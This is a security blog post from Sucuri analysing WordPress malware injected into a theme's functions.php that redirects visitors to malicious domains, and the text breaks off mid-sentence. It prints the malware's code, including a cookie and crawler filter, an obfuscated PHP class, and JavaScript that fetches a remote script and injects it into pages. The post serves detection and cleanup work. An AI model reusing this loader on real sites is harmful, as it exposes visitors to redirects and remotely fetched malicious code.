---
title: Malware Redirects WordPress Traffic to Harmful Sites
url: https://blog.sucuri.net/2025/01/malware-redirects-wordpress-traffic-to-harmful-sites.html
source: Sucuri Blog
date: 2025-01-25
fetch_date: 2025-10-06T20:08:06.161616
---

# Malware Redirects WordPress Traffic to Harmful Sites

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Malware Redirects WordPress Traffic to Harmful Sites

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=60&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

[Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

* January 23, 2025

![Redirects WordPress Traffic to Harmful Sites](https://blog.sucuri.net/wp-content/uploads/2025/01/Blog-Post-Redirects-WordPress-Traffic-to-Harmful-Sites-820x385.png)

Recently, a customer approached us after noticing their website was redirecting visitors to a suspicious URL. They suspected their site had been compromised and sought assistance in identifying and resolving the issue. This prompted a deeper investigation into the infection and its behavior.

## What did we see?

The website’s redirects were leading to **hxxps://cdn1**[**.**]**massearchtraffic**[**.**]**top/sockets**. Upon investigation, we found that the site had been infected with a form of malicious code that caused these redirects. At the time of writing this article, [9 websites](https://publicwww.com/websites/%22cdn1.massearchtraffic.top%22/) are infected with this malicious redirect.

The malicious code was injected into the theme’s **functions.php**.

We detected the malware through SiteCheck, which flagged it as Known JavaScript Malware: **redirect?fake\_click.1**.

![SiteCheck scan](https://blog.sucuri.net/wp-content/uploads/2025/01/SiteCheck-scan.png)

## Analysis of the code

This initial check ensures that the attacker’s code doesn’t run repeatedly on the same session, avoiding detection by anti-malware tools. It does it by checking for a specific cookie if present or not. The script also bypasses execution for logged-in WordPress users, likely to avoid raising suspicion among site administrators.

```
if(isset($_COOKIE['MkQQ'])) {
    die('smR'.'Bh0');
}
```

The malware uses complex regular expressions to filter requests based on user agents (e.g., search engine crawlers) and it also blocks requests containing specific patterns in the URL (e.g., **/wp-login.php**, **/wp-json**).

```
$bad_ua = '#(google|msnbot|baidu|yahoo|search|bing|ask|indexer|cuill.com|clushbot|360spider|80legs|aibot|aboundex|acunetix|ahrefsbot|alexibot|blexbot|backdoorbot|backweb#i';
```

The malware redirects visitors to malicious domain **hxxps://streamain**[**.**]**top/api**[**.**]**php** and potentially compromising their devices. It then injects a script into the visitor’s browser, which fetches and executes additional malicious payloads.

```
class HTTP_X_FORWARDED_FOR {
    public $u = "\x68\x74\x74\x70s\x3a/\x2fs\x74r\x65a\x6dm\x61i\x6e.\x74o\x70/\x61p\x69.\x70h\x70";

    function init() {
        print rawurldecode('%3Bvar%20url%20%3D%20%27https%3A%2F%2Fraw.githubusercontent.com%2FAlexanderRPatton%2Fcdn%2Fmain%2Frepo.txt%27%3Bfetch%28url%29.then%28response%20%3D%3E%20response.text%28%29%29.then%28data%20%3D%3E%20%7Bvar%20script%20%3D%20document.createElement%28%27script%27%29%3Bscript.src%20%3D%20data.trim%28%29%3Bdocument.getElementsByTagName%28%27head%27%29%5B0%5D.appendChild%28script%29%3B%7D%29%3B');
    }
}
$obj = new HTTP_X_FORWARDED_FOR;
$obj->init();
```

The above strings decode to:

hxxps://streamain[.]top/api[.]php and

;var url = ‘hxxps://raw[.]githubusercontent[.]com/AlexanderRPatton/cdn/main/repo.txt’;fetch(url).then(response => response.text()).then(data => {var script = document.createElement(‘script’);script.src = data.trim();document.getElementsByTagName(‘head’)[0].appendChild(script);});

## Potential Impact of the Malware

While the primary payload of this malware is redirecting users, it is possible that the attackers could create additional hidden backdoors for persistent access. It can also lead to leaking sensitive data like admin login credentials may be at risk, exposing the site to further exploitation. Using JavaScript injection to load further malicious content on site can be used to distribute spam, ransomware, or phishing campaigns.

By filtering bots, logged-in users, and administrators, the script remains undetected and keeps sending visitors to external malicious domains.

## How Was the Site Likely Infected and Attackers’ Intentions?

The infection could have occurred due to one or more of the following:

* **Outdated or Nulled Plugins or Themes:** Attackers often exploit vulnerabilities in [outdated plugins or themes](https://blog.sucuri.net/2024/08/the-security-risks-of-using-nulled-wordpress-plugins.html) that have known ...